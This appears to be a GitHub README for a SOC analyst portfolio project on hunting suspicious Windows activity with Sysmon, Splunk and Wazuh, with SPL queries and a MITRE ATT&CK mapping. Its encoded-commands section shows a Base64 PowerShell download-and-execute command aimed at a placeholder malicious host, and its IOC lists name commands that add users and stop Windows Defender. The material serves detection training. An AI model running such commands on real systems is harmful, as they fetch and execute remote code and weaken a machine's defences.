# 🔍 Threat Hunting Using Sysmon Logs

> **SOC Project 6 | Proactive Threat Detection | MITRE ATT&CK Mapped**

[![SOC](https://img.shields.io/badge/Role-SOC%20Analyst%20L1-blue)](https://github.com/riyazshaikplvd)
[![MITRE](https://img.shields.io/badge/Framework-MITRE%20ATT%26CK-red)](https://attack.mitre.org/)
[![Tools](https://img.shields.io/badge/Tools-Sysmon%20%7C%20Splunk-Universal-Forwarder%20%7C%20Splunk-green)](https://github.com/riyazshaikplvd)
[![Status](https://img.shields.io/badge/Status-Completed-brightgreen)](https://github.com/riyazshaikplvd)

---

## 📌 What Is This Project?

This project is about **Threat Hunting** — a proactive approach where a SOC analyst **manually hunts for attackers** hiding inside a system before any alert fires.

Instead of waiting for an alert, we went inside the logs and looked for **suspicious behaviors** that an attacker leaves behind — like PowerShell executing encoded commands, cmd.exe spawning from Word, or processes doing things they should never do.

**Think of it like this:** Normal antivirus waits for the virus to attack. Threat hunting means YOU go searching for the attacker BEFORE they do damage.

---

## 🎯 Objective

> **Find suspicious activities manually inside Windows logs using Sysmon, Wazuh, and Splunk.**

No automated alerts. No pre-built rules. Just raw logs and analyst eyes.

---

## 🛠️ Tools Used

| Tool | Purpose | Why It Matters |
|------|---------|---------------|
| **Sysmon (System Monitor)** | Captures detailed Windows process, network, file events | Default Windows logs miss 80% of attacker activity. Sysmon fills the gap |
| **Windows Event Logs** | Native OS logging (Security, System, Application) | Event IDs like 4688, 4624 reveal login & process activity |
| **Wazuh** | Open-source SIEM for log collection & correlation | Aggregates logs, sends alerts, shows dashboards |
| **Splunk** | Search & analytics platform | Used SPL queries to filter, search, and visualize suspicious patterns |

---

## 🗂️ Repository Structure

```
threat-hunting-sysmon/
│
├── README.md                        ← You are here (complete project guide)
│
├── scripts/
│   ├── sysmon_install.ps1           ← Install & configure Sysmon
│   ├── hunt_powershell.ps1          ← Hunt for suspicious PowerShell
│   ├── hunt_cmd_abuse.ps1           ← Hunt for CMD abuse
│   ├── hunt_parent_child.ps1        ← Detect abnormal parent-child processes
│   ├── hunt_encoded_commands.ps1    ← Find Base64 encoded command executions
│   └── splunk_queries.spl           ← All SPL queries used in Splunk
│
├── logs/
│   └── sample/
│       ├── sysmon_sample.xml        ← Sample Sysmon Event ID 1 logs
│       └── windows_event_sample.xml ← Sample Windows Security Event logs
│
├── reports/
│   ├── threat_hunt_report.md        ← Full investigation report
│   └── ioc_summary.csv             ← All IOCs found in one CSV
│
├── iocs/
│   └── indicators_of_compromise.md  ← Detailed IOC documentation
│
└── mitre-mapping/
    └── attack_mapping.md            ← MITRE ATT&CK technique mapping
```

---

## 🔬 What We Hunted For (Tasks)

### 1. 🖥️ PowerShell Execution
**What is it?**  
PowerShell is a powerful Windows scripting tool. Attackers love it because it can download malware, bypass defenses, and run commands — all from memory without writing files to disk.

**What we looked for:**
- PowerShell launching from unusual parent processes (e.g., Word, Excel spawning PowerShell)
- Commands using `-EncodedCommand` flag (hiding the real command in Base64)
- Downloads using `Invoke-WebRequest` or `IEX` (Invoke-Expression)
- Execution policy bypasses (`-ExecutionPolicy Bypass`)

**Sysmon Event ID:** `1` (Process Create)  
**Windows Event ID:** `4688` (Process Created), `4104` (Script Block Logging)

---

### 2. 💻 CMD Abuse
**What is it?**  
cmd.exe (Command Prompt) is used legitimately by Windows. But attackers abuse it to run hidden commands, delete logs, add users, and move laterally.

**What we looked for:**
- cmd.exe spawned by office apps (Word, Excel, Outlook) — this is almost always malicious
- Commands that add new user accounts (`net user /add`)
- Commands that disable Windows Defender (`sc stop WinDefend`)
- Commands using `%TEMP%` or `%APPDATA%` to hide malicious files

**Sysmon Event ID:** `1` (Process Create)  
**Windows Event ID:** `4688`

---

### 3. 👨‍👦 Suspicious Parent-Child Processes
**What is it?**  
Every process on Windows has a parent (the process that launched it). Normal parent-child relationships are predictable. Attackers break this pattern.

**Normal:** `explorer.exe → chrome.exe`  
**Suspicious:** `winword.exe → powershell.exe` or `svchost.exe → cmd.exe`

**What we looked for:**
- Office applications (winword, excel, outlook) spawning shells (cmd, powershell, wscript)
- System processes (lsass, svchost) spawning unusual children
- Processes running from temp folders (`C:\Windows\Temp\`, `C:\Users\*\AppData\`)

**Sysmon Event ID:** `1` (Process Create — has ParentProcessName field)

---

### 4. 🔐 Encoded Commands
**What is it?**  
Attackers encode their malicious commands in Base64 so it looks like gibberish and bypasses detection rules looking for keywords like "download" or "malware."

**Example of an encoded command:**
```
powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAIgApAA==
```

**Decoded, that is:** `IEX (New-Object Net.WebClient).DownloadString("http://malicious.com/payload")`

**What we looked for:**
- Any PowerShell command line containing `-EncodedCommand` or `-enc`
- Long Base64 strings in process command lines
- Then DECODING them to see the real command

---

## ⚙️ How We Set Up the Lab

### Step 1 — Install Sysmon
```powershell
# Download Sysmon from Microsoft Sysinternals
# https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon

# Install with the SwiftOnSecurity config (best practice config)
sysmon64.exe -accepteula -i sysmonconfig.xml
```

### Step 2 — Verify Sysmon Is Running
```powershell
Get-Service Sysmon64
# Should show: Running

# Check logs are coming in
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10
```

### Step 3 — Connect Logs to Wazuh/Splunk
```xml
<!-- In Wazuh agent ossec.conf -->
<localfile>
  <location>Microsoft-Windows-Sysmon/Operational</location>
  <log_format>eventchannel</log_format>
</localfile>
```

### Step 4 — Start Hunting (Run the Scripts)
```powershell
# Hunt for PowerShell abuse
.\scripts\hunt_powershell.ps1

# Hunt for CMD abuse  
.\scripts\hunt_cmd_abuse.ps1

# Hunt for parent-child anomalies
.\scripts\hunt_parent_child.ps1

# Hunt for encoded commands
.\scripts\hunt_encoded_commands.ps1
```

---

## 🔎 Key Sysmon Event IDs Reference

| Event ID | Name | Why It Matters for Threat Hunting |
|----------|------|----------------------------------|
| **1** | Process Create | Captures every process + its parent + full command line |
| **3** | Network Connection | Catches malware calling home (C2 communication) |
| **7** | Image Loaded | Detects DLL injection attacks |
| **8** | CreateRemoteThread | Classic sign of process injection (Mimikatz, etc.) |
| **10** | ProcessAccess | Catching credential dumping (lsass access) |
| **11** | FileCreate | Malware writing files to disk |
| **12/13** | Registry Events | Persistence via registry (Run keys) |
| **22** | DNS Query | Process making DNS lookups (phoning home) |

---

## 🗺️ MITRE ATT&CK Mapping

| Technique ID | Technique Name | What We Found | Tactic |
|-------------|---------------|---------------|--------|
| T1059.001 | PowerShell | Encoded PS commands, bypass flags | Execution |
| T1059.003 | Windows CMD | CMD spawned from Word/Excel | Execution |
| T1036 | Masquerading | Processes mimicking system names | Defense Evasion |
| T1055 | Process Injection | Unusual parent-child chains | Defense Evasion |
| T1140 | Deobfuscate/Decode | Base64 encoded command decoding | Defense Evasion |
| T1547.001 | Registry Run Keys | Persistence via registry | Persistence |
| T1003.001 | LSASS Memory | ProcessAccess to lsass.exe | Credential Access |
| T1071 | App Layer Protocol | Suspicious network calls post-compromise | C2 |

See full mapping → [mitre-mapping/attack_mapping.md](mitre-mapping/attack_mapping.md)

---

## 🚨 Indicators of Compromise (IOCs) Found

### Process-Based IOCs
```
winword.exe → powershell.exe     [SUSPICIOUS]
excel.exe → cmd.exe              [SUSPICIOUS]
svchost.exe → whoami.exe         [SUSPICIOUS]
powershell.exe with -enc flag    [HIGH RISK]
cmd.exe running from %TEMP%      [HIGH RISK]
```

### Command-Line IOCs
```
-EncodedCommand
-ExecutionPolicy Bypass
Invoke-WebRequest
IEX (Invoke-Expression)
DownloadString
net user /add
sc stop WinDefend
```

### File Path IOCs
```
C:\Windows\Temp\*.exe
C:\Users\*\AppData\Local\Temp\*.ps1
C:\ProgramData\*.exe (unusual)
```

See full IOC list → [iocs/indicators_of_compromise.md](iocs/indicators_of_compromise.md)

---

## 📊 Splunk SPL Queries Used

### Hunt for Encoded PowerShell
```spl
index=wineventlog sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
EventCode=1
CommandLine="*-enc*" OR CommandLine="*-EncodedCommand*"
| table _time, Computer, ParentImage, Image, CommandLine
| sort -_time
```

### Hunt for Suspicious Parent-Child
```spl
index=wineventlog EventCode=1
(ParentImage="*winword*" OR ParentImage="*excel*" OR ParentImage="*outlook*")
(Image="*powershell*" OR Image="*cmd*" OR Image="*wscript*")
| table _time, Computer, ParentImage, Image, CommandLine
```

### Hunt for CMD from Office
```spl
index=wineventlog EventCode=4688
NewProcessName="*cmd.exe"
ParentProcessName IN ("*WINWORD.EXE","*EXCEL.EXE","*OUTLOOK.EXE")
| table TimeCreated, Computer, SubjectUserName, NewProcessName, ParentProcessName, CommandLine
```

### Hunt for LSASS Access (Credential Dumping)
```spl
index=wineventlog EventCode=10
TargetImage="*lsass.exe"
| table _time, Computer, SourceImage, TargetImage, GrantedAccess
```

See all queries → [scripts/splunk_queries.spl](scripts/splunk_queries.spl)

---

## 📝 Investigation Workflow (How We Solved It)

```
Step 1: COLLECT
   Install Sysmon → Enable Script Block Logging → Forward to SIEM

Step 2: IDENTIFY BASELINE
   What is NORMAL behavior on this system?
   (Know your normal to find the abnormal)

Step 3: HUNT
   Run hunting scripts → Search for known attack patterns

Step 4: INVESTIGATE
   For every suspicious hit:
   → Who ran it? (username)
   → What process spawned it? (parent process)
   → What did it do next? (child processes, network connections)
   → What files did it touch?

Step 5: DOCUMENT IOCs
   Record process names, hashes, IPs, domains, command lines

Step 6: MAP TO MITRE ATT&CK
   Match every finding to a MITRE technique

Step 7: REPORT
   Write structured findings → Escalate confirmed threats
```

---

## 💡 Skills Demonstrated

| Skill | Evidence in This Project |
|-------|--------------------------|
| **Threat Hunting** | Manually hunted without automated alerts |
| **Process Analysis** | Analyzed parent-child process chains |
| **MITRE ATT&CK Mapping** | Every finding mapped to ATT&CK technique |
| **Sysmon Expertise** | Knew which Event IDs matter and why |
| **Splunk SPL** | Wrote custom detection queries |
| **PowerShell Analysis** | Decoded Base64 encoded commands |
| **IOC Identification** | Documented all indicators found |
| **Incident Documentation** | Professional report writing |

---

## 🏆 Resume Point (Copy-Paste Ready)

> **Threat Hunting Using Sysmon Logs** — Conducted proactive threat hunting using Splunk, Sysmon, and Windows Event Logs to detect suspicious PowerShell executions, CMD abuse, and abnormal parent-child process relationships. Decoded Base64-encoded attacker commands, identified Indicators of Compromise (IOCs), and mapped all findings to the MITRE ATT&CK framework. Documented investigation results following SOC analysis workflows.

---

## 🚀 Future Use Cases

This project's skills apply directly to:

1. **EDR Analysis** — Same process hunting logic used in CrowdStrike, SentinelOne, Microsoft Defender for Endpoint
2. **SIEM Rule Writing** — The SPL queries here can become detection rules
3. **Incident Response** — When an attack happens, these same techniques are used for forensics
4. **Red Team Detection** — Understanding attacker techniques helps build better defenses
5. **Threat Intelligence** — IOCs collected here can be shared via STIX/TAXII feeds
6. **Purple Team Exercises** — Run these hunts after red team simulations

---

## 👨‍💻 Author

**Riyaz Shaik** | SOC Analyst L1  
📧 riyazshaikplvd@gmail.com  
🔗 [LinkedIn](https://www.linkedin.com/in/riyazshaikplvd)  
🐙 [GitHub](https://github.com/riyazshaikplvd)  
🌐 [Portfolio](https://riyaz-portfolio-delta.vercel.app/)

---

## 📚 References & Resources

- [Sysmon - Microsoft Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
- [SwiftOnSecurity Sysmon Config](https://github.com/SwiftOnSecurity/sysmon-config)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [Wazuh Documentation](https://documentation.wazuh.com/)
- [Splunk Security Essentials](https://splunkbase.splunk.com/app/3435/)
- [Windows Event Log Reference](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/)

---

> ⭐ If this helped you, give it a star! Built as part of a SOC L1 analyst portfolio.
